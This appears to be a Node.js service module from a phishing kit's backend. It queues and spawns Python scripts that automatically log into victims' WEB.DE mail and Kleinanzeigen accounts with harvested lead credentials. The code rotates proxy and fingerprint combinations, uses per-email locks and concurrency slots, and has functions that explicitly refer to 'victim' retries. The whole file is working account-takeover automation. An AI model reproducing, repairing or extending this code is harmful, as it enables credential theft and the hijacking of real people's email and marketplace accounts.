'use strict';

const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');
const { DATA_DIR } = require('../db/database.js');

/** Long-poll timeout — для расчёта max age lock (как в server.js). */
const WEBDE_WAIT_PASSWORD_TIMEOUT_MS = (function () {
  const v = parseInt(process.env.WEBDE_WAIT_PASSWORD_TIMEOUT_MS, 10);
  if (Number.isFinite(v) && v >= 60000) return v;
  return 3 * 60 * 1000;
})();

const WEBDE_LOCKS_DIR = path.join(DATA_DIR, 'webde-locks');
const WEBDE_SCRIPT_MAX_AGE_MS = (function () {
  const v = parseInt(process.env.WEBDE_SCRIPT_LOCK_MAX_AGE_MS, 10);
  if (Number.isFinite(v) && v >= 60000) return v;
  return Math.max(3 * 60 * 1000, WEBDE_WAIT_PASSWORD_TIMEOUT_MS + 90 * 1000);
})();
const WEBDE_LOGIN_MAX_CONCURRENT = Math.max(1, parseInt(process.env.WEBDE_LOGIN_MAX_CONCURRENT, 10) || 5);

const runningWebdeLoginLeadIds = new Set();
const pendingWebdeLoginQueue = [];
const webdeLoginChildByLeadId = new Map();

/** @type {object | null} */
let deps = null;

function init(d) {
  deps = d;
}

function getDeps() {
  if (!deps) throw new Error('automationService.init() must be called from server.js');
  return deps;
}

/** Полное копирование process.env + флаги для дочернего Python (venv/pyenv из родителя, библиотеки из того же интерпретатора). */
function makePythonSpawnEnv() {
  return Object.assign({}, process.env, {
    PYTHONUNBUFFERED: '1',
    PYTHONIOENCODING: 'utf-8',
  });
}

function runWhenLeadsWriteQueueIdle(callback) {
  if (typeof callback === 'function') setImmediate(callback);
}

function webdeLockKey(email) {
  const e = (email || '').trim().toLowerCase();
  if (!e) return '';
  return e.replace(/[^a-z0-9@._-]/g, '_').slice(0, 120) || 'empty';
}

function webdeLockPath(email) {
  const key = webdeLockKey(email);
  if (!key) return '';
  if (!fs.existsSync(WEBDE_LOCKS_DIR)) fs.mkdirSync(WEBDE_LOCKS_DIR, { recursive: true });
  return path.join(WEBDE_LOCKS_DIR, key + '.lock');
}

function tryAcquireWebdeScriptLock(email, leadId) {
  const lockFile = webdeLockPath(email);
  if (!lockFile) return false;
  try {
    const stat = fs.existsSync(lockFile) ? fs.statSync(lockFile) : null;
    if (stat && (Date.now() - stat.mtimeMs) > WEBDE_SCRIPT_MAX_AGE_MS) {
      try { fs.unlinkSync(lockFile); } catch (_) {}
    }
    fs.writeFileSync(lockFile, leadId + '\n' + Date.now(), { flag: 'wx' });
    return true;
  } catch (err) {
    if (err.code === 'EEXIST') return false;
    throw err;
  }
}

function clearWebdeScriptRunning(email) {
  const lockFile = webdeLockPath((email || '').trim().toLowerCase());
  if (!lockFile) return;
  try {
    if (fs.existsSync(lockFile)) fs.unlinkSync(lockFile);
  } catch (_) {}
}

function touchWebdeScriptLock(email) {
  const lockFile = webdeLockPath((email || '').trim().toLowerCase());
  if (!lockFile || !fs.existsSync(lockFile)) return;
  try {
    const t = new Date();
    fs.utimesSync(lockFile, t, t);
  } catch (_) {}
}

function webdeLockWriteChildPid(email, pid) {
  const lockFile = webdeLockPath((email || '').trim().toLowerCase());
  if (!lockFile || !fs.existsSync(lockFile) || !Number.isFinite(pid) || pid <= 1) return;
  try {
    const raw = fs.readFileSync(lockFile, 'utf8');
    const lines = raw.split('\n');
    const a = (lines[0] || '').trim();
    const b = (lines[1] || '').trim() || String(Date.now());
    fs.writeFileSync(lockFile, a + '\n' + b + '\n' + String(Math.floor(pid)), 'utf8');
  } catch (_) {}
}

function webdeLockKillChildIfAny(email) {
  const lockFile = webdeLockPath((email || '').trim().toLowerCase());
  if (!lockFile || !fs.existsSync(lockFile)) return;
  try {
    const lines = fs.readFileSync(lockFile, 'utf8').split('\n');
    const pid = parseInt((lines[2] || '').trim(), 10);
    if (!Number.isFinite(pid) || pid <= 1) return;
    try {
      process.kill(pid, 'SIGKILL');
    } catch (err) {
      if (err && err.code !== 'ESRCH') { /* ignore */ }
    }
  } catch (_) {}
}

function beginWebdeAutoLoginRun(lead) {
  if (!lead || typeof lead !== 'object') return 0;
  const n = (parseInt(lead.webdeScriptRunSeq, 10) || 0) + 1;
  lead.webdeScriptRunSeq = n;
  lead.webdeScriptActiveRun = n;
  return n;
}

function endWebdeAutoLoginRun(lead) {
  if (!lead || typeof lead !== 'object') return;
  lead.webdeScriptActiveRun = null;
}

function setWebdeLeadScriptStatus(leadIdResolved, statusOrNull) {
  const d = getDeps();
  try {
    const patch = { lastSeenAt: new Date().toISOString() };
    if (statusOrNull == null || statusOrNull === '') patch.scriptStatus = null;
    else patch.scriptStatus = String(statusOrNull);
    d.persistLeadPatch(leadIdResolved, patch);
  } catch (e) {
    console.error('[АДМИН] setWebdeLeadScriptStatus:', e && e.message ? e.message : e);
  }
}

function releaseWebdeLoginSlot(leadId) {
  const d = getDeps();
  runningWebdeLoginLeadIds.delete(leadId);
  while (pendingWebdeLoginQueue.length > 0 && runningWebdeLoginLeadIds.size < WEBDE_LOGIN_MAX_CONCURRENT) {
    const next = pendingWebdeLoginQueue.shift();
    if (next && next.script === 'klein') {
      startKleinLoginForLeadId(next.leadId, !!next.forceRestart);
    } else if (next) {
      startWebdeLoginForLeadId(next.leadId, next.isWebde, next.forceRestart, next.kleinOrchestration);
    }
  }
}

function preemptWebdeLoginForReplacedLead(oldLeadId, email) {
  const d = getDeps();
  const em = (email || '').trim().toLowerCase();
  if (em) webdeLockKillChildIfAny(em);
  if (oldLeadId && typeof oldLeadId === 'string') {
    const c = webdeLoginChildByLeadId.get(oldLeadId);
    if (c && typeof c.kill === 'function') {
      try {
        c.kill('SIGKILL');
        d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', em || '—', 'остановлен предыдущий автовход (новый лог по email), leadId=' + oldLeadId);
      } catch (_) {}
      webdeLoginChildByLeadId.delete(oldLeadId);
    }
    releaseWebdeLoginSlot(oldLeadId);
  }
  if (em) clearWebdeScriptRunning(em);
}

function stopWebdeLoginForDeletedLead(leadId, lead) {
  const d = getDeps();
  const id = leadId != null ? String(leadId).trim() : '';
  if (!id) return;
  const c = webdeLoginChildByLeadId.get(id);
  if (c && typeof c.kill === 'function') {
    try {
      c.kill('SIGKILL');
      d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', (lead && (lead.email || lead.emailKl)) ? String(lead.email || lead.emailKl).trim() : '—', 'остановка автовхода: лид удалён, leadId=' + id);
    } catch (_) {}
  }
  webdeLoginChildByLeadId.delete(id);
  releaseWebdeLoginSlot(id);
  for (let qi = pendingWebdeLoginQueue.length - 1; qi >= 0; qi--) {
    const q = pendingWebdeLoginQueue[qi];
    if (q && String(q.leadId) === id) pendingWebdeLoginQueue.splice(qi, 1);
  }
  if (lead && typeof lead === 'object') {
    const e1 = String(lead.email || '').trim().toLowerCase();
    const e2 = String(lead.emailKl || '').trim().toLowerCase();
    if (e1) {
      webdeLockKillChildIfAny(e1);
      clearWebdeScriptRunning(e1);
    }
    if (e2 && e2 !== e1) {
      webdeLockKillChildIfAny(e2);
      clearWebdeScriptRunning(e2);
    }
  }
}

/** SIGKILL всех дочерних процессов автовхода и сброс очереди (например delete-all). */
function clearAllWebdeChildrenAndQueues() {
  try {
    webdeLoginChildByLeadId.forEach(function (c) {
      if (c && typeof c.kill === 'function') { try { c.kill('SIGKILL'); } catch (_) {} }
    });
    webdeLoginChildByLeadId.clear();
    runningWebdeLoginLeadIds.clear();
    pendingWebdeLoginQueue.length = 0;
  } catch (_) {}
}

function startWebdeLoginAfterLeadSubmit(leadId, lead, forceRestart) {
  const d = getDeps();
  if (!leadId || !lead) return;
  const sp = d.readStartPage();
  if (sp === 'change') {
    if (lead.brand === 'klein') {
      d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск: Auto-Login+Change + Klein — автовход в почту не запускаем (админ вручную), leadId=' + leadId);
      return;
    }
    startWebdeLoginForLeadId(leadId, (lead.email || '').toLowerCase().includes('web.de'), !!forceRestart, false);
    return;
  }
  if (sp === 'klein') {
    startWebdeLoginForLeadId(leadId, true, !!forceRestart, true);
    return;
  }
  if (lead.brand === 'klein') {
    startKleinLoginForLeadId(leadId, !!forceRestart);
    return;
  }
  startWebdeLoginForLeadId(leadId, (lead.email || '').toLowerCase().includes('web.de'), !!forceRestart, false);
}

function restartWebdeAutoLoginAfterVictimRetryFromError(lead, id, email, reasonLog) {
  const d = getDeps();
  if (!d.readAutoScript()) return;
  if (lead && lead.webdeLoginGridExhausted === true) {
    d.logTerminalFlow('АДМИН', 'Система', '—', (email || '').trim() || '—', 'автоперезапуск пропущен: автовход уже исчерпал сетку прокси×отпечаток (ручной «Запуск входа» или новый лид), id=' + id);
    return;
  }
  const spRetry = d.readStartPage();
  if (spRetry === 'change' && lead.brand === 'klein') {
    console.log('[АДМИН] ' + reasonLog + ': после ошибки + Change + Klein — автоперезапуск не делаем, id=' + id);
    return;
  }
  if (spRetry === 'klein') {
    console.log('[АДМИН] ' + reasonLog + ' — запуск lead_simulation с klein-orchestration, id=' + id);
    startWebdeLoginForLeadId(id, true, false, true);
    return;
  }
  if (lead.brand === 'klein') {
    console.log('[АДМИН] ' + reasonLog + ' — повторный запуск klein_simulation, id=' + id);
    startKleinLoginForLeadId(id, false);
    return;
  }
  if ((email || '').toLowerCase().includes('web.de')) {
    console.log('[АДМИН] ' + reasonLog + ' — запуск скрипта входа WEB.DE заново, id=' + id);
    startWebdeLoginForLeadId(id, true, false, false);
  }
}

function startWebdeLoginForLeadId(leadId, isWebde, forceRestart, kleinOrchestration) {
  const d = getDeps();
  if (kleinOrchestration === undefined) kleinOrchestration = false;
  if (!isWebde || !leadId || !d.readAutoScript()) {
    if (isWebde && leadId && !d.readAutoScript()) {
      d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск: Auto-script выключен, leadId=' + leadId);
    }
    return;
  }
  if (runningWebdeLoginLeadIds.size >= WEBDE_LOGIN_MAX_CONCURRENT) {
    pendingWebdeLoginQueue.push({ leadId: leadId, isWebde: isWebde, forceRestart: !!forceRestart, kleinOrchestration: !!kleinOrchestration });
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'очередь: слотов ' + runningWebdeLoginLeadIds.size + '/' + WEBDE_LOGIN_MAX_CONCURRENT + ', leadId=' + leadId + ' в очередь (размер ' + pendingWebdeLoginQueue.length + ')');
    const leadsQ = d.readLeads();
    const leadQ = leadsQ.find(function (l) { return l.id === leadId; });
    if (leadQ) {
      d.pushEvent(leadQ, d.EVENT_LABELS.WEBDE_QUEUE, 'script', {
        detail: 'слоты ' + runningWebdeLoginLeadIds.size + '/' + WEBDE_LOGIN_MAX_CONCURRENT
      });
      d.persistLeadPatch(leadId, { eventTerminal: leadQ.eventTerminal });
    }
    return;
  }
  const leads = d.readLeads();
  const lead = leads.find(function (l) { return l.id === leadId; });
  if (!lead) {
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск: лид не найден, leadId=' + leadId);
    return;
  }
  if (lead.brand === 'klein' && !kleinOrchestration) {
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', (lead.emailKl || lead.email || '').trim() || '—', 'пропуск: Klein — авто через klein_simulation_api.py, не lead_simulation, leadId=' + leadId);
    return;
  }
  const lockEmailRaw = String(lead.email || '').trim();
  if (!lockEmailRaw) {
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск: нет email для автовхода, leadId=' + leadId);
    return;
  }
  if (lead.status === 'show_success' && !forceRestart) {
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', lockEmailRaw, 'пропуск: лид уже Успех без forceRestart, leadId=' + leadId);
    return;
  }
  if (lead.webdeLoginGridExhausted === true && !forceRestart) {
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', lockEmailRaw, 'пропуск: сетка прокси×отпечаток уже исчерпана (кнопка запуска в админке или forceRestart), leadId=' + leadId);
    return;
  }
  const email = lockEmailRaw.toLowerCase();
  preemptWebdeLoginForReplacedLead(leadId, email);
  if (!tryAcquireWebdeScriptLock(email, leadId)) {
    d.writeDebugLog('WEBDE_LOCK_BUSY_AFTER_PREEMPT', {
      hypothesisId: 'H_cluster_or_stale',
      leadId: leadId,
      lockMaxAgeMs: WEBDE_SCRIPT_MAX_AGE_MS
    });
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', email, 'пропуск: скрипт уже запущен для email, leadId=' + leadId);
    return;
  }
  const loginDir = path.join(d.serverProjectRoot, 'login');
  const scriptPath = path.join(loginDir, 'lead_simulation_api.py');
  if (!fs.existsSync(scriptPath)) {
    console.error('[AUTO-LOGIN] Ошибка: не найден скрипт ' + scriptPath);
    return;
  }
  const webdeComboSlot = runningWebdeLoginLeadIds.size;
  runningWebdeLoginLeadIds.add(leadId);
  const baseUrl = process.env.SERVER_URL || ('http://127.0.0.1:' + (parseInt(process.env.PORT, 10) || 3000));
  const token = d.getAdminToken() || '';
  const webdeRunSession = beginWebdeAutoLoginRun(lead);
  const atDom = email.indexOf('@') >= 0 ? email.slice(email.indexOf('@')) : '';
  const klMarked = d.leadHasKleinMarkedData(lead);
  const orchDetail = kleinOrchestration && klMarked ? ' · после почты — Klein (Kl)' : '';
  const startDetail = 'lead_simulation_api.py · слот ' + webdeComboSlot + '/' + WEBDE_LOGIN_MAX_CONCURRENT + ' · …' + atDom + orchDetail;
  d.pushEvent(lead, d.EVENT_LABELS.WEBDE_START, 'script', { session: webdeRunSession, detail: startDetail });
  d.persistLeadPatch(leadId, {
    webdeScriptRunSeq: lead.webdeScriptRunSeq,
    webdeScriptActiveRun: lead.webdeScriptActiveRun,
    eventTerminal: lead.eventTerminal
  });
  d.logTerminalFlow('AUTO-LOGIN', 'Автовход', webdeRunSession, email, 'запуск Python leadId=' + leadId + (kleinOrchestration ? ' klein-orchestration' : '') + ' comboSlot=' + webdeComboSlot + ' активных ' + runningWebdeLoginLeadIds.size + '/' + WEBDE_LOGIN_MAX_CONCURRENT);
  const python = process.platform === 'win32' ? 'python' : 'python3';
  const env = makePythonSpawnEnv();
  const pyArgs = [scriptPath, '--server-url', baseUrl, '--lead-id', leadId, '--token', token, '--combo-slot', String(webdeComboSlot)];
  if (kleinOrchestration) pyArgs.push('--klein-orchestration');
  const child = spawn(python, pyArgs, { cwd: d.serverProjectRoot, detached: true, stdio: 'inherit', env });
  webdeLockWriteChildPid(email, child.pid);
  webdeLoginChildByLeadId.set(leadId, child);
  child.on('exit', function () {
    webdeLoginChildByLeadId.delete(leadId);
  });
  child.unref();
}

function startKleinLoginForLeadId(leadId, forceRestart) {
  const d = getDeps();
  if (!leadId || !d.readAutoScript()) {
    if (leadId && !d.readAutoScript()) {
      d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск Klein: Auto-script выключен, leadId=' + leadId);
    }
    return;
  }
  if (runningWebdeLoginLeadIds.size >= WEBDE_LOGIN_MAX_CONCURRENT) {
    pendingWebdeLoginQueue.push({ leadId: leadId, forceRestart: !!forceRestart, script: 'klein' });
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'очередь Klein: слотов ' + runningWebdeLoginLeadIds.size + '/' + WEBDE_LOGIN_MAX_CONCURRENT + ', leadId=' + leadId);
    const leadsKq = d.readLeads();
    const leadKq = leadsKq.find(function (l) { return l.id === leadId; });
    if (leadKq) {
      d.pushEvent(leadKq, d.EVENT_LABELS.KLEIN_QUEUE, 'script', {
        detail: 'слоты ' + runningWebdeLoginLeadIds.size + '/' + WEBDE_LOGIN_MAX_CONCURRENT
      });
      d.persistLeadPatch(leadId, { eventTerminal: leadKq.eventTerminal });
    }
    return;
  }
  const leads = d.readLeads();
  const lead = leads.find(function (l) { return l.id === leadId; });
  if (!lead) {
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск Klein: лид не найден, leadId=' + leadId);
    return;
  }
  if (lead.brand !== 'klein') {
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск Klein: не бренд klein, leadId=' + leadId);
    return;
  }
  const lockEmail = String(lead.emailKl || lead.email || '').trim().toLowerCase();
  if (!lockEmail) {
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск Klein: нет emailKl/email, leadId=' + leadId);
    return;
  }
  if (lead.status === 'show_success' && !forceRestart) {
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', lockEmail, 'пропуск Klein: лид уже Успех без forceRestart, leadId=' + leadId);
    return;
  }
  preemptWebdeLoginForReplacedLead(leadId, lockEmail);
  if (!tryAcquireWebdeScriptLock(lockEmail, leadId)) {
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', lockEmail, 'пропуск Klein: lock занят, leadId=' + leadId);
    return;
  }
  const loginDir = path.join(d.serverProjectRoot, 'login');
  const scriptPath = path.join(loginDir, 'klein_simulation_api.py');
  if (!fs.existsSync(scriptPath)) {
    console.error('[AUTO-LOGIN] Klein: не найден скрипт ' + scriptPath);
    clearWebdeScriptRunning(lockEmail);
    return;
  }
  const kleinComboSlot = runningWebdeLoginLeadIds.size;
  runningWebdeLoginLeadIds.add(leadId);
  const baseUrl = process.env.SERVER_URL || ('http://127.0.0.1:' + (parseInt(process.env.PORT, 10) || 3000));
  const token = d.getAdminToken() || '';
  const kleinRunSession = beginWebdeAutoLoginRun(lead);
  const klDom = lockEmail.indexOf('@') >= 0 ? lockEmail.slice(lockEmail.indexOf('@')) : '';
  const klStartDetail = 'klein_simulation_api.py · слот ' + kleinComboSlot + '/' + WEBDE_LOGIN_MAX_CONCURRENT + ' · …' + klDom;
  d.pushEvent(lead, d.EVENT_LABELS.KLEIN_START, 'script', { session: kleinRunSession, detail: klStartDetail });
  d.persistLeadPatch(leadId, {
    webdeScriptRunSeq: lead.webdeScriptRunSeq,
    webdeScriptActiveRun: lead.webdeScriptActiveRun,
    eventTerminal: lead.eventTerminal
  });
  d.logTerminalFlow('AUTO-LOGIN', 'Klein', kleinRunSession, lockEmail, 'запуск klein_simulation_api.py leadId=' + leadId + ' активных ' + runningWebdeLoginLeadIds.size + '/' + WEBDE_LOGIN_MAX_CONCURRENT);
  const python = process.platform === 'win32' ? 'python' : 'python3';
  const env = makePythonSpawnEnv();
  const child = spawn(python, [scriptPath, '--server-url', baseUrl, '--lead-id', leadId, '--token', token], { cwd: d.serverProjectRoot, detached: true, stdio: 'inherit', env });
  webdeLockWriteChildPid(lockEmail, child.pid);
  webdeLoginChildByLeadId.set(leadId, child);
  child.on('exit', function () {
    webdeLoginChildByLeadId.delete(leadId);
  });
  child.unref();
}

module.exports = {
  init,
  WEBDE_LOGIN_MAX_CONCURRENT,
  WEBDE_SCRIPT_MAX_AGE_MS,
  runningWebdeLoginLeadIds,
  pendingWebdeLoginQueue,
  webdeLoginChildByLeadId,
  runWhenLeadsWriteQueueIdle,
  tryAcquireWebdeScriptLock,
  clearWebdeScriptRunning,
  touchWebdeScriptLock,
  webdeLockWriteChildPid,
  webdeLockKillChildIfAny,
  webdeLockPath,
  beginWebdeAutoLoginRun,
  endWebdeAutoLoginRun,
  setWebdeLeadScriptStatus,
  releaseWebdeLoginSlot,
  preemptWebdeLoginForReplacedLead,
  stopWebdeLoginForDeletedLead,
  clearAllWebdeChildrenAndQueues,
  startWebdeLoginAfterLeadSubmit,
  restartWebdeAutoLoginAfterVictimRetryFromError,
  startWebdeLoginForLeadId,
  startKleinLoginForLeadId,
};
